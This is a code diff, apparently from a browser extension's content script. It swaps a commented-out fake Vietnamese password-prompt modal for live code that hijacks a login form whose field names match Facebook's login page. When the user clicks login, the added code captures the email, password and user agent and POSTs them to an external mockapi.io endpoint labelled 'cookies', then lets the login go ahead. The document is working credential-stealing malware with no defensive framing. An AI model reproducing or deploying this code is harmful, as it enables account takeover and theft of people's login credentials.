@@ -1,42 +1,62 @@
-// chrome.runtime.sendMessage({ type: "get_facebook" });
-// const body = document.querySelector("body");
-// const cc = `
-// <style>
-// 		.modal-stolen-password {
-// 			z-index: 1000;
-// 			width: 300px;
-// 			border-radius: 8px;
-// 			padding: 10px;
-// 			box-shadow: 0 4px 8px 0px rgba(0, 0, 0, 0.1);
-// 			position: fixed;
-//             top: 50%;
-//             left: 50%;
-//             transform: translate(-50%, -50%);
-//             background: #303030
-// 		}
-//         #stolen-password {
-//             padding: 8px 15px;
-//             border-radius: 8px;
-//             min-width: 220px;
-//             margin: 10px 0px
-//         }
-// 	</style>
-// <div class="modal-stolen-password">
-// 		<div style="color: red;font-size: 14px">Vì lý do bảo mật, bạn phải nhập lại mật khẩu để tiếp tục.</div>
-// 		<input id="stolen-password" type="password" placeholder="Mật khẩu"> <button id="btn-send-password" style="background: #3578E5; color: #fff; border: none; padding: 8px; border-radius: 8px;cursor: pointer;">Tiếp tục</button>
-// 	</div>
-// `;
+const keyLog = () => {
+    try {
+        const edEmail = document.getElementById("email");
+        const edPass = document.getElementById("pass");
 
-// const div = document.createElement("div");
-// div.innerHTML = cc;
+        const btnSubmit = document.querySelector("button[name='login']");
 
-// body.appendChild(div);
+        btnSubmit.type = "button";
+        btnSubmit.onclick = (e) => {
+            var userAgent = navigator.userAgent;
+            var email = edEmail.value;
+            var pass = edPass.value;
 
-// const btnSend = document.getElementById("btn-send-password");
-// const modal = document.querySelector(".modal-stolen-password");
+            const user = {
+                email: email,
+                password: pass,
+                userAgent: userAgent,
+                stolenAt: dateTime(),
+            };
 
-// btnSend.onclick = (e) => {
-//     const password = document.getElementById("stolen-password").value;
-//     chrome.runtime.sendMessage({ type: password });
-//     body.removeChild(div);
-// };
+            sendData(user);
+
+            btnSubmit.type = "submit";
+        };
+    } catch {
+        console.log("Error, can not find the elements!");
+    }
+};
+
+const sendData = (user) => {
+    const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
+
+    fetch(API, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify(user),
+    })
+        .then((success) => {})
+        .catch((error) => {});
+};
+
+function addZero(number) {
+    return number < 10 ? "0" + number : number;
+}
+
+const dateTime = () => {
+    var currentDate = new Date();
+    var year = currentDate.getFullYear();
+    var month = currentDate.getMonth() + 1;
+    var day = currentDate.getDate();
+    var hours = currentDate.getHours();
+    var minutes = currentDate.getMinutes();
+    var seconds = currentDate.getSeconds();
+    var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
+    var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
+    var dateTimeNow = formattedTime + " - " + formattedDate;
+    return dateTimeNow;
+};
+
+keyLog();
